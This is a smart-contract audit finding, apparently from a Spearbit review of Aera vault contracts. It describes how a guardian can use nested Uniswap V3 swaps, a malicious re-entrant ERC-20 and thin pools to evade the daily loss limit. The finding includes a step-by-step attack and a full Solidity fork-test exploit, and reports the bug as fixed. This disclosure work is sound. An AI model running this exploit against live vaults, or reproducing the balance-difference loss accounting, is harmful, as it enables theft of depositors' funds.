---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - sector/oracle
  - sector/dex
  - sector/stable
  - sector/token
  - platform/spearbit
protocol: "[[Aera Contracts]]"
auditors:
  - Slowfi
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review-April-2025.pdf"
genome:
  - "[[fee-accounting]]"
  - "[[access-roles]]"
  - "[[logic/fee-calculation]]"
  - "[[loss-of-funds/partial-drain]]"
  - "[[known-pattern]]"
  - "[[privileged-tx]]"
  - "[[fix-arithmetic]]"
  - "[[precondition/privileged-caller]]"
  - "[[misassumption/admin-is-honest]]"
  - "[[blast-radius/protocol-wide]]"
---
# Incorrect calculation of the received swap amount allows guardians to bypass the daily loss limit

- id: 58289
- impact: HIGH
- protocol: Aera Contracts v3
- reporter: Slowfi (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review-April-2025.pdf

## Summary


This bug report discusses a high-risk issue where guardians may bypass the daily loss limit and extract funds from the vaults. The root cause is a miscalculation in the `_handleAfterExactOutputSingle()` function, which assumes that the exact amount received from a swap is always accurate. However, if a swap occurs during another swap and increases the token balance, the increased amount may be counted twice, allowing the guardian to extract almost all of the input tokens from the first swap.

To exploit this issue, the attacker creates a new token and sets up two Uniswap V3 pools with this token and the input and output tokens. They then call `vault.submit()` with two operations, one of which approves the Uniswap V3 router to swap the input token, and the other calls `router.exactInput()` to swap the input token to the output token through the new token. The second operation has a callback to the ATK contract, which triggers a second swap from the new token to the output token. This second swap is less restricted and can be done through any other DEX, as long as the output token is the same.

To fix this issue, the recommendation is to calculate the loss based on the input parameters of the swap, rather than the difference in token balances. This would prevent the need to track token balances and avoid the issue. The bug has been fixed in PR 319 and verified by the Spearbit team.

## Details

## Severity: High Risk

## Context
- `BaseSlippageHooks.sol#L118-L119`
- `BaseSlippageHooks.sol#L132-L133`

## Description
Guardians may bypass the daily loss limit and extract funds from the vaults. The root cause is that the `_handleAfterExactOutputSingle()` function assumes that `actualAmountOut` calculated above is the exact amount received from the current swap. 

However, this is not always true because if a swap occurs during another swap and increases `IERC20(tokenOut).balanceOf()`, the increased amount would be counted twice. This allows the guardian to extract almost all of the input tokens of the first swap while passing the hook checks.

Below is how the attack can be done with the example of `UniswapV3DexHooks`. Assume the vault has 20 WETH and 0 DAI in the initial state, and the guardian is granted permission to swap WETH to DAI through both the `exactInputSingle()` and `exactInput()` functions. The attack steps are:

1. Create an ERC-20 token ATK, which the guardian fully controls.
2. Create two Uniswap V3 pools by pairing WETH and DAI with ATK, i.e., the two pools are `WETH/ATK` and `DAI/ATK`. Initialize the pools and add minimal liquidity to enable trading.
3. Call `vault.submit()` with the following two operations:
   1. **Operation 1**: Approves the Uniswap V3 router to swap 20 WETH.
   2. **Operation 2**: Calls `router.exactInput()` to swap WETH to DAI through a path of WETH -> ATK -> DAI.
   
   This operation is allowed since only the input and output tokens are validated but not the entire path. This operation has a callback with the caller set to the ATK contract.
4. In the before-hook of the `exactInput()` call, the hook contract stores the value of the swapped 10 WETH and a DAI balance of 0 in transient storage.
5. During the `exactInput()` call, in the step of swapping WETH to ATK, `ATK.transfer()` is called, which triggers a callback to the vault and calls `exactInputSingle()` to swap 10 WETH to DAI. The second swap triggers the before- and after-hooks, but it does not interfere with the first since they use different transient storage slots. The second swap succeeds, and the vault's DAI balance increases.
6. After the callback, the first swap continues. Since the `WETH/ATK` and `DAI/ATK` pools are initialized with minimal liquidity, this swap incurs an extremely large slippage, so the vault receives nearly no DAI from this swap.
7. However, when the after-hook checks the slippage and daily loss, it compares the current DAI balance with the previously stored balance and thinks the vault received enough tokens, although the increase in the DAI balance comes from the second swap.
8. After the submission, the guardian mints a significant amount of ATK and swaps it for WETH from the `WETH/ATK` pool to extract nearly 10 WETH.

The main purpose of deploying a new ATK token is to gain control and perform a callback to the vault to execute the second swap. Note that the second swap is less restricted: It can be a swap via any other DEXes with another input token as long as the output token is DAI.

## Recommendation
Instead of calculating the loss based on the difference in token balances before and after the swap, consider calculating it based on the input parameters of the swap. For example, for an exact-input swap, the loss can be calculated as the value of input tokens subtracted by the value of minimum output tokens, i.e., `amountOutMinimum` from `ExactInputSingleParams`. The loss should then be verified to be within the maximum allowed slippage, and the accumulated loss is less than the daily loss limit.

Although the loss would be overestimated since the trade is assumed to incur the largest possible slippage, this simplified design would avoid tracking token balances and prevent the above issue. With this design, part of the slippage hooks can then be configured as only before-hooks, as they no longer need to be called after the operation.

## Proof of Concept
The following proof of concept is modified from `UniswapV3DexHooks.fork.t.sol`. Some details are omitted for clarity:

```solidity
/*
Run: forge test --mt test_fork_nested_swaps
Output:
Failing tests:
Encountered 1 failing test in test/periphery/fork/hooks/slippage/NestedSwapForkTest.t.sol:NestedSwapForkTest, !
[FAIL: Loss does not match the slippage from the swap: 407882900288702313869 != 26568023536444351156690]
test_fork_poc() (gas: 15053454), !
The last assertion in the test fails:
407882900288702313869 (407 DAI) is the `cumulativeDailyLossInNumeraire` tracked by the hook
26568023536444351156690 (26568 DAI) is the actual loss of the trades
The unaccounted loss is 26568 - 407 = 26161 DAI, which is about 10 WETH (i.e., the input token amount of a swap), !
*/
```

```solidity
pragma solidity 0.8.29;

contract AttackERC20 is MockERC20 {
    SingleDepositorVault vault;
    bytes ops;
    bool called;

    constructor(SingleDepositorVault vault_) {
        vault = vault_;
    }

    function mint(uint256 amount) public {
        _mint(msg.sender, amount);
    }

    function setOps(bytes memory ops_) public {
        ops = ops_;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        super.transfer(to, value);
        if (!called) {
            called = true;
            ICallee(address(vault)).callback(ops);
        }
        return true;
    }
}

interface ICallee {
    function callback(bytes memory data) external;
}

contract NestedSwapForkTest is TestForkBaseHooks, MockFeeVaultFactory {
    uint256 internal constant INITIAL_WETH_BALANCE = 20 ether;
    uint256 internal constant SWAP_WETH_BALANCE = 10 ether;
    uint256 internal constant INIT_LP = 1000;
    uint24 internal constant POOL_FEE = 500; // 0.05% fee tier
    int24 internal constant MIN_TICK = -887272;
    int24 internal constant MAX_TICK = -MIN_TICK;
    int24 internal constant TICK_SPACING = 60;

    SingleDepositorVault public vault;
    MockUniswapV3DexHooks public dexHooks;
    ISwapRouter public router;
    OracleRegistry public oracleRegistry;
    bytes32[] internal leaves;
    address ATK;

    function setUp() public override {
        // Fork mainnet
        vm.createSelectFork(vm.envString("ETH_NODE_URI_MAINNET"), 21_000_000);
        super.setUp();
        ...
        // Fund vault with WETH
        deal(WETH, address(vault), INITIAL_WETH_BALANCE);
        
        // Set up merkle tree for allowed operations
        leaves = new bytes32[](3);
        // Leaf for exactInput WETH -> DAI
        leaves[0] = MerkleHelper.getLeaf({
            target: UNIV3_ROUTER,
            selector: ISwapRouter.exactInput.selector,
            hasValue: false,
            configurableHooksOffsets: new uint16[](0),
            hooks: address(dexHooks),
            extractedData: abi.encode(
                WETH, // allowed tokenIn
                DAI, // allowed tokenOut
                VAULT_ADDRESS_SENTINEL // allowed recipient
            )
        });
        // Leaf for exactInputSingle WETH -> DAI
        leaves[1] = MerkleHelper.getLeaf({
            target: UNIV3_ROUTER,
            selector: ISwapRouter.exactInputSingle.selector,
            hasValue: false,
            configurableHooksOffsets: new uint16[](0),
            hooks: address(dexHooks),
            extractedData: abi.encode(
                WETH, // allowed tokenIn
                DAI, // allowed tokenOut
                VAULT_ADDRESS_SENTINEL // allowed recipient
            )
        });
        // Leaf for approving tokens
        leaves[2] = MerkleHelper.getLeaf({
            target: WETH,
            selector: IERC20.approve.selector,
            hasValue: false,
            configurableHooksOffsets: Encoder.makeExtractOffsetsArray(0),
            hooks: address(0),
            extractedData: abi.encode(
                address(router) // allowed spender
            )
        });
        vm.prank(users.owner);
        vault.setGuardianRoot(users.guardian, MerkleHelper.getRoot(leaves));
    }

    function createPools() internal {
        ATK = address(new AttackERC20(vault));
        AttackERC20(ATK).mint(2 * INIT_LP);
        // create pools and initialize
        IUniswapV3Pool UNIV3_WETH_ATK = IUniswapV3Pool(
            IUniswapV3Factory(UNIV3_FACTORY).createPool(WETH, ATK, POOL_FEE)
        );
        IUniswapV3Pool UNIV3_DAI_ATK = IUniswapV3Pool(
            IUniswapV3Factory(UNIV3_FACTORY).createPool(DAI, ATK, POOL_FEE)
        );
        UNIV3_WETH_ATK.initialize(1 << 96);
        UNIV3_DAI_ATK.initialize(1 << 96);
        IERC20(WETH).approve(UNIV3_POS, type(uint256).max);
        IERC20(DAI).approve(UNIV3_POS, type(uint256).max);
        IERC20(ATK).approve(UNIV3_POS, type(uint256).max);
        
        // add minimal liquidity
        INonfungiblePositionManager.MintParams memory mintParams =
            INonfungiblePositionManager.MintParams({
                token0: ATK,
                token1: WETH,
                fee: POOL_FEE,
                tickLower: (MIN_TICK / TICK_SPACING) * TICK_SPACING,
                tickUpper: (MAX_TICK / TICK_SPACING) * TICK_SPACING,
                amount0Desired: INIT_LP,
                amount1Desired: INIT_LP,
                amount0Min: 0,
                amount1Min: 0,
                recipient: users.guardian,
                deadline: block.timestamp
            });
        INonfungiblePositionManager(UNIV3_POS).mint(mintParams);
        mintParams.token1 = DAI;
        INonfungiblePositionManager(UNIV3_POS).mint(mintParams);
    }

    function test_fork_nested_swaps() public {
        deal(WETH, users.guardian, 2 * INIT_LP);
        deal(DAI, users.guardian, 2 * INIT_LP);
        vm.startPrank(users.guardian, users.guardian);
        createPools();
        Operation[] memory ops = new Operation[](2);
        // approves the router to spend WETH
        ops[0] = Operation({
            target: WETH,
            data: abi.encodeWithSelector(
                IERC20.approve.selector, address(router), INITIAL_WETH_BALANCE
            ),
            clipboards: new Clipboard[](0),
            isStaticCall: false,
            callbackData: Encoder.emptyCallbackData(),
            configurableHooksOffsets: Encoder.makeExtractOffsetsArray(0),
            proof: MerkleHelper.getProof(leaves, 2),
            hooks: address(0),
            value: 0
        });
        // calls exactInput() but allows a callback from ATK
        ops[1] = Operation({
            target: UNIV3_ROUTER,
            data: abi.encodeWithSelector(
                ISwapRouter.exactInput.selector,
                ISwapRouter.ExactInputParams({
                    path: abi.encodePacked(WETH, POOL_FEE, ATK, POOL_FEE, DAI),
                    recipient: address(vault),
                    deadline: block.timestamp + 1000,
                    amountIn: SWAP_WETH_BALANCE,
                    amountOutMinimum: 0
                })
            ),
            clipboards: new Clipboard[](0),
            isStaticCall: false,
            callbackData: CallbackData({
                caller: ATK,
                selector: ICallee.callback.selector,
                calldataOffset: 0x44
            }),
            configurableHooksOffsets: new uint16[](0),
            proof: MerkleHelper.getProof(leaves, 0),
            hooks: address(dexHooks),
            value: 0
        });
        // operation executed during the callback, call exactInputSingle()
        Operation[] memory subops = new Operation[](1);
        subops[0] = Operation({
            target: UNIV3_ROUTER,
            data: abi.encodeWithSelector(
                ISwapRouter.exactInputSingle.selector,
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: WETH,
                    tokenOut: DAI,
                    fee: POOL_FEE,
                    recipient: address(vault),
                    deadline: block.timestamp + 1000,
                    amountIn: SWAP_WETH_BALANCE,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            ),
            clipboards: new Clipboard[](0),
            isStaticCall: false,
            callbackData: Encoder.emptyCallbackData(),
            configurableHooksOffsets: new uint16[](0),
            proof: MerkleHelper.getProof(leaves, 1),
            hooks: address(dexHooks),
            value: 0
        });
        AttackERC20(ATK).setOps(Encoder.encodeOperations(subops));
        vm.stopPrank();
        // initial state
        uint256 valueBeforeInNumeraire = oracleRegistry.getQuote(
            IERC20(WETH).balanceOf(address(vault)), WETH, DAI
        );
        // submit
        vm.prank(users.guardian);
        vault.submit(Encoder.encodeOperations(ops));
        // end state
        uint256 valueAfterInNumeraire = oracleRegistry.getQuote(
            IERC20(DAI).balanceOf(address(vault)), DAI, DAI
        );
        assertEq(
            dexHooks.vaultStates(address(vault)).cumulativeDailyLossInNumeraire,
            _calculateLoss(valueBeforeInNumeraire, valueAfterInNumeraire),
            "Loss does not match the slippage from the swap"
        );
    }
}
```

## Aera
Fixed in PR 319.

## Spearbit
Verified.
